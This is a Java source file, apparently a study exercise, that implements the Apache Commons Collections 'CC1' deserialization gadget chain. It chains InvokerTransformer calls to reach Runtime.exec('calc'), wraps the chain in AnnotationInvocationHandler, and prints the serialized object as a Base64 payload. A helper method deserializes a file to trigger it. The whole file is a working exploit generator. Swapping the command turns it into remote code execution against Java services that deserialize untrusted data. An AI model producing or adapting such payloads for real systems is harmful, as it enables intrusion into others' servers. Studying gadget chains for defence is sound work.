package gadget.cc;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class CC1Test {
    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException {

        Transformer[] transformers=new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[] {String.class,Class[].class},new Object[] {"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[] {Object.class,Object[].class},new Object[] {null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
        };
        ChainedTransformer c=new ChainedTransformer(transformers);
        HashMap map=new HashMap();
        map.put("value","value");
        Map<Object,Object> transformedMap=TransformedMap.decorate(map,null,c);

        Class cc=Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor annotationInvocationHandlerConstructor =cc.getDeclaredConstructor(Class.class,Map.class);
        annotationInvocationHandlerConstructor.setAccessible(true);
        Object o=annotationInvocationHandlerConstructor.newInstance(Target.class,transformedMap);
        String encode = Base64.getEncoder().encodeToString(serialize(o));
        System.out.println(encode);
//        unserialize();
    }

    public static byte[] serialize(Object obj) throws IOException {
        ByteArrayOutputStream aos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(aos);
        oos.writeObject(obj);
        oos.flush();
        oos.close();
        return aos.toByteArray();
    }

    public static void unserialize() throws IOException, ClassNotFoundException {
        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream("CC1-1.bin"));
        objectInputStream.readObject();
    }
}
